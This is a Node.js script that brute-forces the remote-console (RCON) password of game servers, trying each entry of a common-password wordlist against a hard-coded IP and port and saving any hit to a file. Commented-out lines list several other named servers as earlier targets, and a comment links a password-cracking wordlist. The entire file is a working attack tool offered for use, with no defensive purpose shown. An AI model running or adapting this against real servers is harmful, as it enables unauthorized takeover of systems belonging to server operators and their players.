// i've run this for several hours straight without getting errors, however i do not guarantee no crashes

// nice wordlists: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

const Q3RCon = require("quake3-rcon");
const fs = require('fs');
const LineByLineReader = require('line-by-line');

//  let ip = '134.255.220.86'; /* marlboro */
//  let port = '32240';

//  let ip = '54.37.215.209'; /* Electric Mind Greek rp */
//  let port = '30120';

//  let ip = '195.201.196.99'; /* Greek Elites */
//  let port = '1899';

let ip = '134.255.233.201'; /* greek life */
let port = '30120';

var found = false;
var rconNotSet = false;

function log(resp, password)
{
    line1 = `---------------------------------------- RCON PASSWORD FOUND! ----------------------------------------\n`;
    line2 = `- IP : ${ip}:${port}\n`;
    line3 = `- Response : ${resp}\n`;
    line4 = `- Password : ${password}\n`;
    line5 = `-----------------------------------------------------------------------------------------------------\n`;
    line6 = `\n`;

    fileName = 'found.txt';

    fs.appendFileSync(fileName, line1);
    fs.appendFileSync(fileName, line2);
    fs.appendFileSync(fileName, line3);
    fs.appendFileSync(fileName, line4);
    fs.appendFileSync(fileName, line5);
    fs.appendFileSync(fileName, line6);

    console.log(`[INFO] Found RCON!`);
    console.log(`[INFO] File : ${fileName}\n`.green);
    console.log(`-----------------------------------------------------------------------------------------------------`);
}

console.log(`---------------------------------------- Starting Script! ----------------------------------------`);

function tryServer1(reader, tryPassword) {
    reader.pause();

    if(tryPassword == '')
        tryPassword = 'emptypass';

    console.log(`--- Attempting ${tryPassword}`);

    var rcon = new Q3RCon({
        address: ip,
        port: port,
        password: tryPassword,
        debug: false
    });

    rcon.send("start runcode", function(resp) {
        if( !(resp.toString().indexOf("set rcon_password") == -1 )) {
            rconNotSet = true;
        }

        if (resp.toString().indexOf("Invalid") == -1
            && resp.toString().indexOf("set rcon_password") == -1
            && resp.toString().indexOf("getinfo xxx") == -1
            && resp.toString().indexOf("start runcode") == -1
        ) {
            log(resp, tryPassword);
            found = true;
        }

        reader.resume();
    });
}

function tryServer2(tryPassword) {
    if(tryPassword == '')
        tryPassword = 'emptypass';

    console.log(`--- Attempting ${tryPassword}`);

    var rcon = new Q3RCon({
        address: ip,
        port: port,
        password: tryPassword,
        debug: false
    });

    rcon.send("start runcode", function(resp) {
        if( !(resp.toString().indexOf("set rcon_password") == -1) ) {
            rconNotSet = true;
        }

        if (resp.toString().indexOf("Invalid") == -1
            && resp.toString().indexOf("set rcon_password") == -1
            && resp.toString().indexOf("getinfo xxx") == -1
            && resp.toString().indexOf("start runcode") == -1
        ) {
            log(resp, tryPassword);
            found = true;
        }
    });
}

const file = 'wordlists/100k-most-used-passwords-NCSC1.txt';

lr = new LineByLineReader(file, { encoding: 'utf8', skipEmptyLines: true });

lr.on('error', function (err) {
    throw err;
});

lr.on('line', function(word) {

    /* Method 1 */
    // Most efficient. Will go one by one through a wordlist and wait for each word to finish before getting to the next one.

    if(rconNotSet) {
        lr.close();
        console.log('Rcon Password is not set on this server.');
        process.exit(0);
    }

    if(found) {
        lr.close();
        console.log('rcon found');
        process.exit(0);
    }

    tryServer1(lr, word);


    /* Method 2 */
    // Will take multiple words at once and go through all of them at the same time. Much faster, but the handling is not so efficient (might give crashes).

    /*lr.pause();

    setTimeout(function () {
        if(rconNotSet) {
            lr.close();
            console.log('Rcon Password is not set on this server.');
            process.exit(0);
        }

        if(found) {
            lr.close();
            console.log('rcon found');
            process.exit(0);
        }

        tryServer2(word);

        lr.resume();
    }, 10); // little timeout, it prevents crashes but idk why lol */
});

lr.on('end', function () {
    console.log('Finished ' + file);
    process.exit(0);
});